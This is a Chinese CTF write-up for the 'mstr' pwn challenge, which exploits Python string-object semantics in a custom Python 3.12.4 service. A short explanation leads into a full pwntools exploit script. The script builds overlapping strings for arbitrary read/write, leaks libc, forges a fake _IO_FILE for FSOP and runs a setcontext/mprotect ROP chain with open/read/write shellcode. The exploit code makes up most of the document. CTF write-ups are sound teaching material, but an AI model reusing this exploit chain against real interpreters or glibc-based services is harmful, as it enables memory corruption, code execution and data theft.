# mstr

## 题目简述

目标基于 Python 字符串语义：`str` 被假定不可变，单字节字符串会复用 runtime 对象，而 `max_size` 也由字符串对象承载。通过 `add_str` 构造长度溢出和重叠字符串，最终形成越界读写并打 FSOP。

## 解题过程

### 关键观察

目标基于 Python 字符串语义：`str` 被假定不可变，单字节字符串会复用 runtime 对象，而 `max_size` 也由字符串对象承载。

### 求解步骤

python的str不可变，因为假定不可变，单字节的一直返回的是runtime的str。而max_size同样用
str存储，所以可以通过add_str构造任意长度的溢出。 从而能构造出overlap的str，用低地址的
str篡改地址较高的str的length可以做到任意大小越界读写，拿到leak后打fsop。
大概50%，远程成功率还要低，奇妙原因:)
#!/usr/bin/env python3
# -*- coding: utf-8 -*
import re
import os
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
local = 0
ip = "<challenge-host>"
port = 26000
# ip = "127.0.0.1"
# port = 10000
ELF_PATH = "./Python-3.12.4/python"
SCRIPT_PATH = "./mstr.py"
# if local:
#     p = process([ELF_PATH, SCRIPT_PATH])
# else:
#     p = remote(ip,port)
elf = ELF(ELF_PATH)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
script = '''

'''
size = 0x1101
local_docker_size = 0x1721
remote_size = 0x1641 # ??? random
def dbg():
    if local:
        gdb.attach(p,script)
    pause()
def cmd(c):
    p.sendlineafter(b"> ", c)

def new(content):
    payload = b'new ' + content
    cmd(payload)
    # if not local and ip != "127.0.0.1":
        # sleep(1)

def set_max(idx, size):
    payload = b'set_max ' + str(size).encode() + b' ' + str(idx).encode()
    cmd(payload)

def plus_eq(idx1, idx2):
    payload = b'+= ' + str(idx1).encode() + b' ' + str(idx2).encode()
    cmd(payload)

def plus(idx1, idx2):
    payload = b'+ ' + str(idx1).encode() + b' ' + str(idx2).encode()
    cmd(payload)

def print_max(idx):
    payload = b'print_max '+ str(idx).encode()
    cmd(payload)

def print_c(idx):
    payload = b'print '+ str(idx).encode()
    cmd(payload)

def modify(idx, offset, val):
    payload = b'modify ' + str(idx).encode() + b' ' + str(offset).encode() +
b' ' + str(val).encode()
    cmd(payload)


def write(idx, offset, content):
    for i in range(len(content)):
        modify(idx, offset + i, (content[i]))
def exploit(p):
    pause()
    new(b'7')#0
    new(b'8')#1
    new(b'a'*0x10)#2
    for i in range(30):
        new(b"a"*0x40) # 3 -> 32
    dbg()
    for i in range(2,33,1):
        set_max(i, 7)
    plus_eq(0, 1)
    plus_eq(0, 1)
    plus_eq(0, 1)
    plus_eq(0, 1)
    plus_eq(0, 1)
    plus_eq(0, 1)
    # pause()
    for i in range(3):
        plus_eq(32, 2)
    write(32, 0x40, p64(0)*6)
    for i in range(3):
        new(str(i).encode()*0x40) # 33->35
    print_c(32)
    p.recvuntil(b'a'*0x40)
    p.recv(0x10)
    PyUnicode_Type = u64(p.recv(8))
    info("PyUnicode_Type = "+hex(PyUnicode_Type))
    write(32, 0x58, p64(0x2c30))
    arbw_idx = 33
    print_c(33)
    p.recvuntil(b"0"*0x40)
    p.recvuntil(b"\x00"*(0x2c30-0x180))
    p.recv(0x58)

    leak = u64(p.recv(8))
    libc_base = 0x3e0df0 + leak
    info("leak = "+hex(leak))
    info("libc = "+hex(libc_base))

    pos = libc_base - 0x3e3bf8
    write(32, 0x58, p64(0x7fffffffffffffff))
    target = libc_base + libc.symbols["_IO_list_all"]
    fake_io_addr = libc_base + 0x207000


    pop_rdi = 0x000000000010f78b + libc_base
    pop_rsi = 0x0000000000110a7d + libc_base
    pop_rax = 0x00000000000dd237 + libc_base
    pop_r13 = 0x00000000000584d9 + libc_base
    mov_rdx_r13 = 0x00000000000b00d7 + libc_base
    ret = pop_rdi + 1
    flag_addr = fake_io_addr + 0x118
    syscall = libc_base + 0x11ba8f
    rop = p64(pop_r13)*2 + p64(6) + p64(mov_rdx_r13) + p64(0) * 4
    rop += p64(pop_rdi)+p64(fake_io_addr & ~0xfff)+p64(pop_rsi)+p64(0x3000) +
p64(libc_base+libc.symbols["mprotect"])
    rop += p64(fake_io_addr + 0x1c8+0x8)
    rop += asm("add rsp, 0x1000")
    rop += asm(shellcraft.open("/flag.txt", 0, 0) + shellcraft.read(3, "rsp",
0x100) + shellcraft.write(1, "rsp", 0x100))
    # 0x00000000000584d9 : pop r13 ; ret
    # 0x00000000000b00d7 : mov rdx, r13 ; pop rbx ; pop r12 ; pop r13 ; pop
rbp ; ret

    # call_addr = libc_base + 0x04A99D # setcontext
    call_addr = libc_base + libc.symbols["setcontext"] + 61

    fake_IO_FILE = p64(0)*6
    fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
    fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx setcontext rdi
    fake_IO_FILE +=p64(call_addr) #_IO_save_end=call addr(call
setcontext/system)
    fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
    fake_IO_FILE += p64(0)  # _chain
    fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
    fake_IO_FILE += p64(libc_base + 0x205700)  # _lock = a writable address
    fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
    fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
    fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
    fake_IO_FILE += p64(1) #mode=1
    fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
    fake_IO_FILE += p64(libc_base+0x202258)
    fake_IO_FILE +=p64(0)*6
    fake_IO_FILE += p64(fake_io_addr+0x40) + b"/flag\x00" # rax2_addr
    fake_IO_FILE = fake_IO_FILE.ljust(0xa0 + 0x88, b'\x00') + p64(0x40)

    fake_IO_FILE = fake_IO_FILE.ljust(0xa0 + 0xa0, b"\x00") + p64(fake_io_addr
+ 0xa0 + 0xc8) + p64(ret)

    fake_flags = 0
    fake_IO_read_ptr = 0
    payload = p64(fake_flags) + p64(fake_IO_read_ptr) + fake_IO_FILE + rop
    write(arbw_idx, fake_io_addr - pos, payload)
    write(arbw_idx, target - pos, p64(fake_io_addr))
    info("fake_io_addr = "+hex(fake_io_addr))

### 跨页补回：FSOP exploit 收尾

info("call_addr = "+hex(call_addr))
    # dbg()
    pause()
    p.shutdown("send")
    p.interactive()
# while True:
if 1:
    try:
        if local:
            p = process([ELF_PATH, SCRIPT_PATH])
            # size = 0x1641
        else:
            p = remote(ip,port)
            # if ip == "127.0.0.1":
            size = 0x1721
            # size=0x1001
        exploit(p)
        # if local:
            # break
    except Exception:
        size += 0x10
        # pause()
        p.close()
        # continue

## 方法总结

- 核心技巧：Python 字符串对象布局破坏、overlap、任意读写、FSOP。
- 识别信号：业务提供字符串拼接、长度上限修改和可打印/修改接口。
- 复用要点：先通过重叠对象改长度扩大读写范围，再泄露 libc 并布置 `_IO_list_all`。
